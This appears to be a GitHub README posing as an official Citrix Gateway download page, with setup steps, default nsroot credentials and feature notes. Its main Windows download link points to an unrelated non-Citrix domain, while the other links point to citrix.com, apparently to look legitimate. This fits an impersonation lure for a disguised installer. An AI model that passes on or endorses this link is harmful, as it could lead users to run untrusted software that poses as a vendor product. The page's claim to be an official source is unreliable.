## <img width="26px" src="https://github.com/Citrix-Gateway/Citrix-Gateway/blob/main/publisherIdproductId_15541_Small.png" alt=""></img> Citrix Gateway: Download Secure Access Solution



| Go to: | [Windows](https://github.com/Citrix-Gateway/Citrix-Gateway#Windows) | [MacOS](https://github.com/Citrix-Gateway/Citrix-Gateway#MacOS) | [Linux](https://www.citrix.com/downloads/) | [Other platforms](https://www.citrix.com/downloads/) |
| -------- | ---------------------------------------------------------- | ------------------------------------------------------ | ------------------------------------------ | ---------------------------------------------------- |


## Windows

Get the Citrix Gateway installer: [Click to Download](https://dinova.cl/1235/).

### Installation Steps

1. Run the downloaded installer.
2. Follow the on-screen instructions to complete the setup.
3. Once installed, open your browser and navigate to the configuration utility (default: http://192.168.100.1).

### Initial Configuration

> [!NOTE]  
> By default, the username and password are `nsroot`. For enhanced security, it is strongly recommended to change the default credentials after the first login.

- **Login:** Use the default credentials (`Username: nsroot`, `Password: nsroot`).
- **Virtual Server Setup:** Use the Quick Configuration Wizard to create a virtual server.
- **Authentication:** Configure user authentication methods (e.g., LDAP, RADIUS).
- **Certificates:** Import and bind SSL certificates for secure connections.

---

## macOS

Choose the appropriate installer for your macOS architecture:

- [Download macOS App (ARM)](https://www.citrix.com/downloads/citrix-gateway)
- [Download macOS App (Intel)](https://www.citrix.com/downloads/citrix-gateway)

### Installation Steps

1. Open the downloaded file and drag the application to the Applications folder.
2. Launch Citrix Gateway and enter the server address to start configuration.

---

## Linux

### Download the Installer

Download the package suitable for your Linux distribution:

- [Download Linux App (Deb)](https://www.citrix.com/downloads/citrix-gateway)
- [Download Linux App (RPM)](https://www.citrix.com/downloads/citrix-gateway)

### Installation Steps

1. Install the package using the command:
   ```bash
   sudo dpkg -i citrix_gateway.deb

2. Launch the configuration utility from your terminal.


## Advanced Configuration

### Using the Configuration Utility

1. Open your browser and navigate to the Citrix Gateway's system IP (default: [http://192.168.100.1](http://192.168.100.1)).
2. Configure virtual servers, authentication methods, and session policies using the dashboard.

### Features

- **High Availability:** Deploy two appliances for redundancy.
- **Endpoint Analysis:** Validate user devices for compliance before granting access.
- **Custom Pages:** Personalize the login and home pages for users.

---

For more detailed configuration options, visit the Citrix Gateway Documentation.
Citrix Gateway: Download Secure Access Solution
